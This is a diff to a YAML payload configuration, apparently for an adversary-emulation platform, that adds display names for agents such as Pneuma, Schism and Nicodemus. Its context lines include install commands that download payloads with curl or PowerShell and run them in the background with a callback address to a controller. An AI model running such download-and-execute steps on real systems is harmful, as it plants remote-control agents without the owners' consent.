@@ -20,8 +20,10 @@ translators:
         tar xzf /tmp/translators/grpc.tar.gz -C /tmp/translators && \
         sudo pip3 install -r /tmp/translators/grpc/requirements.txt && \
         nohup sudo python3 /tmp/translators/grpc/server.py &
-    ftp-source.zip: {}
-    grpc-source.zip: {}
+    ftp-source.zip:
+      shortname: FTP Translator
+    grpc-source.zip:
+      shortname: GRPC Translator
 
 pneuma:
   metadata:
@@ -54,7 +56,8 @@ pneuma:
         $wc.DownloadFile("$myurl","C:\aws\download\pneuma-windows.exe")
         Start-Process -FilePath C:\aws\download\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{callback} -range Cloud"
     pneuma-darwin: {}
-    pneuma-source.zip: {}
+    pneuma-source.zip:
+      shortname: Pneuma
 
 schism:
   metadata:
@@ -73,7 +76,8 @@ schism:
     schism.py:
       install: |
         curl 'PAYLOAD.URL' > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
-    schism-source.zip: {}
+    schism-source.zip:
+      shortname: Schism
 
 nicodemus:
   metadata:
@@ -95,7 +99,8 @@ nicodemus:
     nicodemus-darwin: {}
     nicodemus-linux: {}
     nicodemus-windows.exe: {}
-    nicodemus-source.zip: {}
+    nicodemus-source.zip:
+      shortname: Nicodemus
 
 ctf:
   metadata:
@@ -109,4 +114,5 @@ ctf:
   payloads:
     vulnerable.sh:
       install: curl 'PAYLOAD.URL' > tmp/vulnerable.sh && chmod +x /tmp/vulnerable.sh && sudo ./vulnerable.sh
-    ctf-source.zip: {}
+    ctf-source.zip:
+      shortname: Vulnerable server build script
